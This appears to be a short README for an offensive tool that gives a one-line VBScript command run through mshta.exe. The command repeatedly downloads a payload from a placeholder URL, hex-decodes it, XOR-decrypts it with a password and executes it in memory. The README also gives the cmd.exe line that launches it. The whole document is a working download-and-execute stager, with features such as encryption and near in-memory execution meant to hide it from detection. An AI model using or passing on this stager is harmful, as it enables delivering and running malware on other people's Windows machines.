# MSHTA-VBS-download-and-execute
Downloads, decode, decrypt and executes a VBScript using cmd and mshta
```
'=========================================='
'                 Features                 '  
'++++++++++++++++++++++++++++++++++++++++++'
' [*] Autoreconnect                        '
' [*] Hexadecimal encoded payload (UTF8)   '
' [*] Encrypted payload                    '
' [*] In (almost) memory execution         '
'++++++++++++++++++++++++++++++++++++++++++'
'<---------------------------------------->'
'<========================================>'
'<---------------------------------------->'
'mshta.exe one line command                '
'mshta.exe maximum command length   : 487  '
'Script length with double quotes   : 330  '
'<---------------------------------------->'
'=========================================='
```
## One line command
```
"On Error Resume Next:Set a=CreateObject(""MSXML2.ServerXMLHTTP.6.0""):a.setOption 2,13056:while(Len(b)=0):a.open""GET"",""LINK_TO_YOUR_PAYLOAD"",False:a.send:b=a.responseText:wend:k=""PAYLOAD_PASSWORD"":for i=0to Len(b)-1Step 2:c=c&Chr(Asc(Chr(""&H""&Mid(b,i+1,2)))xor Asc(Mid(k,((i/2)mod Len(k))+1,1))):Next:ExecuteGlobal c:"
```

## Example
```
(cmd.exe): mshta vbscript:execute("ONE LINE COMMAND")(window.close)
```
